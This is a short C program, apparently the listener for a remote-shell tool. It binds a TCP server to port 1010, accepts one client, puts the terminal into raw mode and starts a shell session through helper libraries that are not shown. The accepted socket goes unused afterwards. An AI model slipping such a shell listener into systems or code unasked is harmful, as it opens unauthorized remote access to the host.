#include <stdio.h>
#include <stdlib.h>

#include "xtcpsocket.h"
#include "xterminal.h"
#include "xfragment.h"
#include "xshell.h"

#define SERVER_PORT 1010
#define BACKLOG_LIMIT 6

int main()
{
    xterminal_init();

    xtcpsocket_t server_socket;
    if (xtcpsocket_create(&server_socket, AF_INET, xst_server) == -1)
    {
        fprintf(stderr,
                "[!] xtcpsocket_create() failed\n\r");
        exit(EXIT_FAILURE);
    }

    if (xtcpsocket_bind(&server_socket, NULL, SERVER_PORT) == -1)
    {
        fprintf(stderr,
                "[!] xtcpsocket_bind() failed\n\r");
        exit(EXIT_FAILURE);
    }

    if (xtcpsocket_listen(&server_socket, BACKLOG_LIMIT) == -1)
    {
        fprintf(stderr,
                "[!] xtcpsocket_listen() failed\n\r");
        exit(EXIT_FAILURE);
    }

    xtcpsocket_t client_socket;
    if (xtcpsocket_accept(&server_socket, &client_socket) == -1)
    {
        fprintf(stderr,
                "[!] xtcpsocket_accept() failed\n\r");
        exit(EXIT_FAILURE);
    }

    // REQUEST A NEW SHELL SESSION
    
    if (xterminal_disable_buffering() == -1)
    {
        fprintf(stderr,
                "[!] xterminal_disable_buffering() failed\n\r");
        exit(EXIT_FAILURE);
    }

    if (xterminal_disable_echoing() == -1)
    {
        fprintf(stderr,
                "[!] xterminal_disable_echoing() failed\n\r");
        exit(EXIT_FAILURE);
    }
    if(xshell_start())
    xterminal_reset();
    return 0;
}